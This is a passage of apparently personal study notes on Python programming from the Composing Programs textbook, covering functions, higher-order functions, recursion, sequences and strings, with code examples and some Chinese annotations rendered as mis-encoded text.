id="1-3-7-Operators"><a href="#1-3-7-Operators" class="headerlink" title="1.3.7 Operators"></a>1.3.7 Operators</h3><p>The <code>//</code> operator, rounds the result down to an integer.</p><p>The operator can be seen as shorthand for function, like: <code>+</code> is the shorthand of <code>add()</code>.</p><h2 id="1-4-Designing-Function"><a href="#1-4-Designing-Function" class="headerlink" title="1.4 Designing Function"></a>1.4 Designing Function</h2><p>The qualities of good functions all reinforce the idea that functions are abstractions.<br>    - Each function should have exactly one job<br>    - Donâ€™t repeat yourself is a central tenet of software engineering<br>    - Functions should be defined generally</p><h3 id="1-4-1-Documentation"><a href="#1-4-1-Documentation" class="headerlink" title="1.4.1 Documentation"></a>1.4.1 Documentation</h3><p>Dostring, using triple quoted. The first line describes the job of the function in one line. The following lines can describe arguments and clarify the behavior of the function. è¿™æ˜¯åˆ¶ä½œ<code>help</code>é¡µï¼Œwhen you call <code>help</code> with the name of a function as an argument, you see its docstring.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">pressure</span>(<span class="hljs-params">v, t, n</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;Compute the pressure in pascals of an ideal gas.</span><br><span class="hljs-string"></span><br><span class="hljs-string">        Applies the ideal gas law: http://en.wikipedia.org/wiki/Ideal_gas_law</span><br><span class="hljs-string"></span><br><span class="hljs-string">        v -- volume of gas, in cubic meters</span><br><span class="hljs-string">        t -- absolute temperature in degrees kelvin</span><br><span class="hljs-string">        n -- particles of gas</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        k = <span class="hljs-number">1.38e-23</span>  <span class="hljs-comment"># Boltzmann&#x27;s constant</span><br>        <span class="hljs-keyword">return</span> n * k * t / v<br></code></pre></td></tr></table></figure><p><mark>Comments</mark> use <code>#</code>.</p><h3 id="1-4-2-Default-Argument-Values"><a href="#1-4-2-Default-Argument-Values" class="headerlink" title="1.4.2 Default Argument Values"></a>1.4.2 Default Argument Values</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">def</span> pressure(v, t, n=<span class="hljs-number">6</span>.<span class="hljs-number">022</span>e23)<br></code></pre></td></tr></table></figure><h2 id="1-5-Control"><a href="#1-5-Control" class="headerlink" title="1.5 Control"></a>1.5 Control</h2><p>Python code is a sequence of statements.</p><p><mark>Practical Guidance</mark><br>When indenting a suite, all lines must be indented the same amount and in the same way(use spaces, not tabs). Any variation in indentation will cause an error.</p><h3 id="1-5-3-Defining-Functions-II-Local-Assignment"><a href="#1-5-3-Defining-Functions-II-Local-Assignment" class="headerlink" title="1.5.3 Defining Functions II: Local Assignment"></a>1.5.3 Defining Functions II: Local Assignment</h3><p>The process of function application terminates whenever the first <code>return</code> statement is excuted.</p><h3 id="1-5-4-Conditional-Statements"><a href="#1-5-4-Conditional-Statements" class="headerlink" title="1.5.4 Conditional Statements"></a>1.5.4 Conditional Statements</h3><p><mark>Conditional statements</mark></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">if</span> <span class="hljs-symbol">&lt;expression&gt;</span>:<br>     <span class="hljs-symbol">&lt;suite&gt;</span><br>elif <span class="hljs-symbol">&lt;expression&gt;</span>:<br>     <span class="hljs-symbol">&lt;suite&gt;</span><br><span class="hljs-keyword">else</span>:<br>     <span class="hljs-symbol">&lt;suite&gt;</span>]<br></code></pre></td></tr></table></figure><p>Python includes several false value, including 0, None, and the boolean value false.</p><p>The built-in comparison operations: &lt;, &gt;, &gt;&#x3D;, &lt;&#x3D;, &#x3D;&#x3D;, !&#x3D;.</p><p>Three basic logical operators are also built into Python: and, or, not.</p><p>Functions that perform comparisons and return boolean values typically begin with <code>is</code>.</p><h3 id="1-5-5-Iteration"><a href="#1-5-5-Iteration" class="headerlink" title="1.5.5 Iteration"></a>1.5.5 Iteration</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">while</span> <span class="hljs-symbol">&lt;expression&gt;</span>:<br>  <span class="hljs-symbol">&lt;suite&gt;</span><br></code></pre></td></tr></table></figure><h3 id="1-5-6-Testing"><a href="#1-5-6-Testing" class="headerlink" title="1.5.6 Testing"></a>1.5.6 Testing</h3><p><mark>Assertions</mark>. Programmers use <code>assert</code> statements to verify expectations, such as the output of a function being tested.</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">assert</span> fib(<span class="hljs-number">8</span>) == <span class="hljs-number">13</span>, &#x27;The <span class="hljs-number">8</span>th Fibonacci number should be <span class="hljs-number">13</span>&#x27;<br></code></pre></td></tr></table></figure><p>å¦‚æœä¸º false åˆ™æ‰“å°åé¢çš„ expression.</p><p><code>doctest</code> module. åˆ©ç”¨ docstring æ¥æµ‹è¯•.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">sum_naturals</span>(<span class="hljs-params">n</span>):<br>      <span class="hljs-string">&quot;&quot;&quot;Return the sum of the first n natural numbers.</span><br><span class="hljs-string"></span><br><span class="hljs-string">      &gt;&gt;&gt; sum_naturals(10)</span><br><span class="hljs-string">      55</span><br><span class="hljs-string">      &gt;&gt;&gt; sum_naturals(100)</span><br><span class="hljs-string">      5050</span><br><span class="hljs-string">      &quot;&quot;&quot;</span><br>      total, k = <span class="hljs-number">0</span>, <span class="hljs-number">1</span><br>      <span class="hljs-keyword">while</span> k &lt;= n:<br>          total, k = total + k, k + <span class="hljs-number">1</span><br>      <span class="hljs-keyword">return</span> total<br></code></pre></td></tr></table></figure><p>Starting Python with the doctest command line option:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python3</span> -<span class="hljs-keyword">m</span> doctest <span class="hljs-symbol">&lt;python_source_file&gt;</span><br></code></pre></td></tr></table></figure><h2 id="1-6-Higher-Order-Functions"><a href="#1-6-Higher-Order-Functions" class="headerlink" title="1.6 Higher-Order Functions"></a>1.6 Higher-Order Functions</h2><p>Functions that manipulate functions are called higher-order functions.</p><p>Frames which are no longer needed are removed to save space.</p><p>åœ¨å‡½æ•°è¢«è°ƒç”¨æ—¶æ‰ä¼šåˆ›å»º local frame.</p><h3 id="1-6-1-Functions-as-Arguments"><a href="#1-6-1-Functions-as-Arguments" class="headerlink" title="1.6.1 Functions as Arguments"></a>1.6.1 Functions as Arguments</h3><h3 id="1-6-2-Functions-as-General-Methods"><a href="#1-6-2-Functions-as-General-Methods" class="headerlink" title="1.6.2 Functions as General Methods"></a>1.6.2 Functions as General Methods</h3><h3 id="1-6-3-Defining-Functions-III-Nested-Definitions"><a href="#1-6-3-Defining-Functions-III-Nested-Definitions" class="headerlink" title="1.6.3 Defining Functions III: Nested Definitions"></a>1.6.3 Defining Functions III: Nested Definitions</h3><p>To place function definitions inside the body of other definitions:</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-keyword">def</span> <span class="hljs-title function_">sqrt</span>(<span class="hljs-params">a</span>):<br>       <span class="hljs-keyword">def</span> <span class="hljs-title function_">sqrt_update</span>(<span class="hljs-params">x</span>):<br>           <span class="hljs-keyword">return</span> average(x, a/x)<br>       <span class="hljs-keyword">def</span> <span class="hljs-title function_">sqrt_close</span>(<span class="hljs-params">x</span>):<br>           <span class="hljs-keyword">return</span> approx_eq(x * x, a)<br>       <span class="hljs-keyword">return</span> improve(sqrt_update, sqrt_close)<br></code></pre></td></tr></table></figure><p><mark>Lexical scope</mark><br>A discipline of sharing names among nested definitions. The inner functions have access to the names in the environment where they are defined.</p><p>Two extensions to the environment model:<br>    - Each user-defined function has a parent environment: the environment in which it was defined<br>    - When a user-defined function is called, its local frame extends its parent environment.</p><h3 id="1-6-4-Functions-as-Returned-Values"><a href="#1-6-4-Functions-as-Returned-Values" class="headerlink" title="1.6.4 Functions as Returned Values"></a>1.6.4 Functions as Returned Values</h3><h3 id="1-6-5-Example-Newtonâ€™s-Method"><a href="#1-6-5-Example-Newtonâ€™s-Method" class="headerlink" title="1.6.5 Example: Newtonâ€™s Method"></a>1.6.5 Example: Newtonâ€™s Method</h3><h3 id="1-6-6-Currying"><a href="#1-6-6-Currying" class="headerlink" title="1.6.6 Currying"></a>1.6.6 Currying</h3><p>We can use higher-order function to convert a function that takes multiple arguments into a chain of functions that each take a single argument.</p><p>Currying is a transformation, like:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">def</span> <span class="hljs-title function_">curried_pow</span>(<span class="hljs-params">x</span>):<br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">h</span>(<span class="hljs-params">y</span>):<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">pow</span>(x, y)<br>        <span class="hljs-keyword">return</span> h<br><br><span class="hljs-meta">&gt;&gt;&gt; </span>curried_pow(<span class="hljs-number">2</span>)(<span class="hljs-number">3</span>)<br><span class="hljs-number">8</span><br><br></code></pre></td></tr></table></figure><p><mark>Extended Environments</mark><br>An environment can consist of an arbitrarily long chain of frames, which always concludes with the global frame.</p><h3 id="1-6-7-Lambda-Expressions"><a href="#1-6-7-Lambda-Expressions" class="headerlink" title="1.6.7 Lambda Expressions"></a>1.6.7 Lambda Expressions</h3><p>åŒ¿åå‡½æ•°. ä¸ºäº†æ›´ç®€æ´ã€‚</p><p>A lambda expression evaluates to a function that has a single return expression as its body. Assignment and control statements are not allowed.</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">lambda</span>            <span class="hljs-variable">x</span>            :          <span class="hljs-function"><span class="hljs-title">f</span>(<span class="hljs-title">g</span>(<span class="hljs-variable">x</span>))</span><br><span class="hljs-string">&quot;A function that    takes x    and returns     f(g(x))&quot;</span><br></code></pre></td></tr></table></figure><h3 id="1-6-8-Abstractions-and-First-Class-Functions"><a href="#1-6-8-Abstractions-and-First-Class-Functions" class="headerlink" title="1.6.8 Abstractions and First-Class Functions"></a>1.6.8 Abstractions and First-Class Functions</h3><h3 id="1-6-9-Function-Decorators"><a href="#1-6-9-Function-Decorators" class="headerlink" title="1.6.9 Function Decorators"></a>1.6.9 Function Decorators</h3><p>The decorator symbol <code>@</code>.</p><p><code>@</code> åé¢è·Ÿä¸€ä¸ª expression, this expression is evaluated first, the <code>def</code> statement second, and finally the result of evaluating the decorator expression is applied to the newly defined function, and the result if bound to the name in the <code>def</code> statement.</p><p>ä½œç”¨:</p><ol><li>ä½¿å‡½æ•°çš„åŠŸèƒ½å¾—åˆ°è¡¥å……ï¼Œè€ŒåŒæ—¶ä¸ç”¨ä¿®æ”¹å‡½æ•°æœ¬èº«çš„ä»£ç </li><li>å¢åŠ å‡½æ•°æ‰§è¡Œå‰ã€åçš„è¡Œä¸ºï¼Œè€Œä¸éœ€å¯¹è°ƒç”¨å‡½æ•°çš„ä»£ç åšä»»ä½•æ”¹å˜ã€‚</li></ol><p>æ„Ÿè§‰å°±æ˜¯åœ¨å½“å‰å‡½æ•°çš„åŸºç¡€ä¸Šæ·»åŠ åŠŸèƒ½ã€‚å‡å°‘é‡å¤ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">def</span> <span class="hljs-title function_">trace</span>(<span class="hljs-params">fn</span>):<br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">wrapped</span>(<span class="hljs-params">x</span>):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;-&gt; &#x27;</span>, fn, <span class="hljs-string">&#x27;(&#x27;</span>, x, <span class="hljs-string">&#x27;)&#x27;</span>)<br>            <span class="hljs-keyword">return</span> fn(x)<br>        <span class="hljs-keyword">return</span> wrapped<br><br><span class="hljs-meta">&gt;&gt;&gt; </span>@trace<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">triple</span>(<span class="hljs-params">x</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">3</span> * x<br></code></pre></td></tr></table></figure><p>åœ¨è°ƒç”¨<code>triple</code>æ—¶å°±ä¼šåŒæ—¶æ‰§è¡Œ<code>trace</code>å’Œ<code>triple</code>ä¸­çš„å†…å®¹ã€‚</p><h2 id="1-7-Recursive-Functions"><a href="#1-7-Recursive-Functions" class="headerlink" title="1.7 Recursive Functions"></a>1.7 Recursive Functions</h2><p>The operators <code>%</code> and <code>//</code> can be used to separate a number into two parts: its last digit and all but its last digit.</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-number">18117</span> % <span class="hljs-number">10</span></span><br>7<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-number">18117</span> // <span class="hljs-number">10</span></span><br>1811<br></code></pre></td></tr></table></figure><p>The process of excuting the body of a recursive function may in turn require applying that function again.</p><h3 id="1-7-1-The-Anatomy-of-Recursive-Functions"><a href="#1-7-1-The-Anatomy-of-Recursive-Functions" class="headerlink" title="1.7.1 The Anatomy of Recursive Functions"></a>1.7.1 The Anatomy of Recursive Functions</h3><p>A common pattern: the body begins with a base case, a conditional statement that define the behavior of the function for the inputs that are simplest to process.</p><h3 id="1-7-2-Mutual-Recursion"><a href="#1-7-2-Mutual-Recursion" class="headerlink" title="1.7.2 Mutual Recursion"></a>1.7.2 Mutual Recursion</h3><p>A recursive procedure is divided among two functions that call each other.</p><h3 id="1-7-3-Printing-in-Recursive-Functions"><a href="#1-7-3-Printing-in-Recursive-Functions" class="headerlink" title="1.7.3 Printing in Recursive Functions"></a>1.7.3 Printing in Recursive Functions</h3><h3 id="1-7-4-Tree-Recursion"><a href="#1-7-4-Tree-Recursion" class="headerlink" title="1.7.4 Tree Recursion"></a>1.7.4 Tree Recursion</h3><p>A function with multiple recursive calls is said to be <mark>tree recursive</mark> because each call branches into multiple smaller calls, each of which branches into yes smaller calls, just as the branches of a tree become smaller but more numerous as they extend from the trunk.</p><h3 id="1-7-5-Example-Partitions"><a href="#1-7-5-Example-Partitions" class="headerlink" title="1.7.5 Example: Partitions"></a>1.7.5 Example: Partitions</h3><h2 id="Project-1-The-Game-of-Hog"><a href="#Project-1-The-Game-of-Hog" class="headerlink" title="Project 1: The Game of Hog"></a>Project 1: The Game of Hog</h2><h1 id="Champter-2-Building-Abstractions-with-Data"><a href="#Champter-2-Building-Abstractions-with-Data" class="headerlink" title="Champter 2: Building Abstractions with Data"></a>Champter 2: Building Abstractions with Data</h1><h2 id="2-1-Introduction"><a href="#2-1-Introduction" class="headerlink" title="2.1 Introduction"></a>2.1 Introduction</h2><h3 id="2-1-1-Native-Data-Types"><a href="#2-1-1-Native-Data-Types" class="headerlink" title="2.1.1 Native Data Types"></a>2.1.1 Native Data Types</h3><p>The built-in <code>type</code> function allows us inspect the class of any value.</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs haskell">&gt;&gt;&gt; <span class="hljs-class"><span class="hljs-keyword">type</span>(2)</span><br>&lt;<span class="hljs-keyword">class</span> &#x27;int&#x27;&gt;<br></code></pre></td></tr></table></figure><p>Native data types have the following properties:</p><ol><li>There are expressions that evaluate to value of native types, called <code>literals</code></li><li>There are built-in functions and operators to manipulate values of native types.</li></ol><p>Python has three native numeric types: integers(int), real numbers(float), and complex numbers(complex).</p><p><code>int</code> objects represent integers exactly, without any approximation or limits on their size.</p><p><code>float</code> objects have minimum and maximum values.</p><h2 id="2-2-Data-Abstraction"><a href="#2-2-Data-Abstraction" class="headerlink" title="2.2 Data Abstraction"></a>2.2 Data Abstraction</h2><p>Data abstraction isolates how a compound data value is used from the details of how it is constructed.</p><h3 id="2-2-1-Example-Rational-Numbers"><a href="#2-2-1-Example-Rational-Numbers" class="headerlink" title="2.2.1 Example: Rational Numbers"></a>2.2.1 Example: Rational Numbers</h3><p>Dividing integers produces a <code>float</code> approximation, losing the exact precision of integers.</p><p>A powerful strategy for designing programs: wishful thinking.</p><h3 id="2-2-2-Pairs"><a href="#2-2-2-Pairs" class="headerlink" title="2.2.2 Pairs"></a>2.2.2 Pairs</h3><p>Python provides a compound structure called a <code>list</code>.</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">&gt;&gt;&gt; <span class="hljs-selector-attr">[10, 20]</span><br><span class="hljs-selector-attr">[10, 20]</span><br></code></pre></td></tr></table></figure><p>Two ways to ä½¿ç”¨ the elements in <code>list</code>:</p><ol><li>assignment, èµ‹å€¼</li><li>element selection operator, ä½¿ç”¨ index</li></ol><p>The equivalent function for element selection operator is called <code>getitem</code>.</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-keyword">from</span> operator <span class="hljs-keyword">import</span> getitem</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">getitem(pair, <span class="hljs-number">0</span>)</span><br>10<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">getitem(pair, <span class="hljs-number">1</span>)</span><br>20<br></code></pre></td></tr></table></figure><h3 id="2-2-3-Abstraction-Barriers"><a href="#2-2-3-Abstraction-Barriers" class="headerlink" title="2.2.3 Abstraction Barriers"></a>2.2.3 Abstraction Barriers</h3><p>These functions are called by a higher level and implemented using a lower level of abstraction.</p><p>The fewer functions that depend on a particular representation, the fewer changes are required when one wants to change that representation. ä¹Ÿå°±æ˜¯ç”¨å‡½æ•°å»æ„å»ºå¦ä¸€ä¸ªå‡½æ•°.</p><h3 id="2-2-4-The-Properties-of-Data"><a href="#2-2-4-The-Properties-of-Data" class="headerlink" title="2.2.4 The Properties of Data"></a>2.2.4 The Properties of Data</h3><h2 id="2-3-Sequences"><a href="#2-3-Sequences" class="headerlink" title="2.3 Sequences"></a>2.3 Sequences</h2><p>Sequences is a collection of behavious that are shared among several different types of data.</p><ul><li>Length</li><li>Element selection</li></ul><h3 id="2-3-1-Lists"><a href="#2-3-1-Lists" class="headerlink" title="2.3.1 Lists"></a>2.3.1 Lists</h3><p>A list value is a sequence that can have arbitrary length.</p><p>The built-in <code>len</code> function returns the length of a sequence.</p><p>Lists can be added together and multiplied by integer:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">&gt;&gt;&gt; <span class="hljs-selector-attr">[2, 7]</span> + digits * <span class="hljs-number">2</span><br><span class="hljs-selector-attr">[2, 7, 1, 8, 2, 8, 1, 8, 2, 8]</span><br></code></pre></td></tr></table></figure><h3 id="2-3-2-Sequence-Iteration"><a href="#2-3-2-Sequence-Iteration" class="headerlink" title="2.3.2 Sequence Iteration"></a>2.3.2 Sequence Iteration</h3><p>The <code>for</code> statement:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">def</span> <span class="hljs-title function_">count</span>(<span class="hljs-params">s, value</span>):<br>      <span class="hljs-string">&quot;&quot;&quot;Count the number of occurrences of value in sequence s.&quot;&quot;&quot;</span><br>      total = <span class="hljs-number">0</span><br>      <span class="hljs-keyword">for</span> elem <span class="hljs-keyword">in</span> s:<br>          <span class="hljs-keyword">if</span> elem == value:<br>              total = total + <span class="hljs-number">1</span><br>      <span class="hljs-keyword">return</span> total<br><br></code></pre></td></tr></table></figure><p>The <name> will be bound to the last element of the sequence after the <code>for</code> statement is executed.</p><p>The pattern of binding multiple names to multiple values in a fixed-length sequence is called <code>sequence unpacking</code>:</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs llvm">&gt;&gt;&gt; for <span class="hljs-keyword">x</span><span class="hljs-punctuation">,</span> y in pairs:<br>      if <span class="hljs-keyword">x</span> <span class="hljs-operator">=</span><span class="hljs-operator">=</span> y:<br>          same_count <span class="hljs-operator">=</span> same_count + <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>A <mark>range</mark> is another built-in type of sequence in Python, which represents a range of integers.</p><p>Ranges are created with <code>range</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>)  <span class="hljs-comment"># Includes 1, but not 10</span><br><span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>)<br></code></pre></td></tr></table></figure><p>Calling the <code>list</code> constructor on a range evaluates to a list:</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>, <span class="hljs-number">8</span>))</span><br>[5, 6, 7]<br></code></pre></td></tr></table></figure><p>A common convention is to use a single underscore character for the name in the <code>for</code> header if the name is unused in the suite:</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">&gt;&gt;&gt; for _ in range(<span class="hljs-number">3</span>):<br>        print(<span class="hljs-string">&#x27;Go Bears!&#x27;</span>)<br><br>Go Bears!<br>Go Bears!<br>Go Bears!<br></code></pre></td></tr></table></figure><h3 id="2-3-3-Sequence-Processing"><a href="#2-3-3-Sequence-Processing" class="headerlink" title="2.3.3 Sequence Processing"></a>2.3.3 Sequence Processing</h3><p>List Comprehensions:</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">odds = [<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">7</span>, <span class="hljs-number">9</span>]</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">[x+<span class="hljs-number">1</span> <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> odds]</span><br>[2, 4, 6, 8, 10]<br></code></pre></td></tr></table></figure><p>The general form is:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">[<span class="hljs-tag">&lt;<span class="hljs-name">map</span> <span class="hljs-attr">expression</span>&gt;</span> for <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span> in <span class="hljs-tag">&lt;<span class="hljs-name">sequence</span> <span class="hljs-attr">expression</span>&gt;</span> if <span class="hljs-tag">&lt;<span class="hljs-name">filter</span> <span class="hljs-attr">expression</span>&gt;</span>]<br></code></pre></td></tr></table></figure><p><mark>Aggregation</mark>, to aggregate all value in a sequence into a single value.<br><mark>Higher-Order Functions</mark><br><mark>Conventional Names</mark><br>In Python programs, it is more common to use list comprehension directly rather than higher-order functions, but both approaches to sequence processing are widely used.</p><h3 id="2-3-4-Sequence-Abstraction"><a href="#2-3-4-Sequence-Abstraction" class="headerlink" title="2.3.4 Sequence Abstraction"></a>2.3.4 Sequence Abstraction</h3><p><mark>Membership</mark>, A value can be tested for membership in a sequence. å°±æ˜¯çœ‹ä¸€ä¸ªå…ƒç´ æ˜¯å¦åœ¨ list ä¸­. </p><p>Python has two operators <code>in</code> and <code>not in</code>:</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">digits</span><br>[1, 8, 2, 8]<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-number">2</span> <span class="hljs-keyword">in</span> digits</span><br>True<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-number">1828</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> digits</span><br>True<br></code></pre></td></tr></table></figure><p><mark>Slicing</mark>, sequences contain smaller sequences within them. å°±æ˜¯æŠŠ list æ‹†åˆ†.</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css">&gt;&gt;&gt; digits<span class="hljs-selector-attr">[0:2]</span><br><span class="hljs-selector-attr">[1, 8]</span><br>&gt;&gt;&gt; digits<span class="hljs-selector-attr">[1:]</span><br><span class="hljs-selector-attr">[8, 2, 8]</span><br></code></pre></td></tr></table></figure><h3 id="2-3-5-Strings"><a href="#2-3-5-Strings" class="headerlink" title="2.3.5 Strings"></a>2.3.5 Strings</h3><p>The constructor <code>str</code>.</p><p>String literals are surrounded by either single or double quotation marks.</p><p>Strings have a length and they support element selection.</p><p>Like lists, strings can also be combined via addtion and multiplication:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"> &gt;&gt;&gt; <span class="hljs-string">&#x27;Berkeley&#x27;</span> + <span class="hljs-string">&#x27;, CA&#x27;</span><br><span class="hljs-string">&#x27;Berkeley, CA&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;Shabu &#x27;</span> * <span class="hljs-number">2</span><br><span class="hljs-string">&#x27;Shabu Shabu &#x27;</span><br></code></pre></td></tr></table></figure><p><mark>Membership</mark>, it matches substrings rather than elements:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;here&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;Where&#x27;s Waldo?&quot;</span><br><span class="hljs-literal">True</span><br></code></pre></td></tr></table></figure><p><mark>Multiple Literals</mark>, use triple quoting.<br><mark>String Coerction</mark>, a string can be created from any object in Python by calling the <code>str</code> constructor function.</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs isbl">&gt;&gt;&gt; <span class="hljs-function"><span class="hljs-title">str</span>(<span class="hljs-number">2</span>) + <span class="hljs-string">&#x27; is an element of &#x27;</span> + <span class="hljs-title">str</span>(<span class="hljs-variable">digits</span>)</span><br><span class="hljs-string">&#x27;2 is an element of [1, 8, 2, 8]&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="2-3-6-Trees"><a href="#2-3-6-Trees" class="headerlink" title="2.3.6 Trees"></a>2.3.6 Trees</h3><p>The data abstraction for a <code>tree</code> consists of the constructor <code>tree</code> and theselectors <code>label</code> and <code>branches</code>.</p><p>A tree is well-formed only if it has a root label and all branches are also 